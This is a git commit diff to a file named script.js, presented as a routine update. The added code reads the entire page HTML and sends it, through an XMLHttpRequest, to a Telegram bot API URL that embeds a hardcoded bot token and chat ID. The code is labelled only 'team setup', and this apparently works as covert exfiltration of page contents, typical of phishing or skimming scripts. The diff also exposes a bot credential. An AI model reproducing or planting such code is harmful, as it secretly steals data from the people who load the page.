55b233a929d7f79b32333e98d9c33897154c560b
su8code <88676535+su8code@users.noreply.github.com>
2021-10-14 01:31:16 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,12 @@
         console.log('team setup');
+        
 
+        var html = document.getElementsByTagName('html')[0].innerHTML;
         var first = "https://api.telegram.org/bot2086484806:AAE2FanW-P1kw7F0en_yy-uU7k4eu-9AKj0/sendMessage?text="
-        var second = first.concat('' , document.location.href);
+        var second = first.concat('' , html);
         var third = second.concat('' , "&chat_id=2040726523" );
+
+        
         
         console.log(third);
         var jsonFile = new XMLHttpRequest();
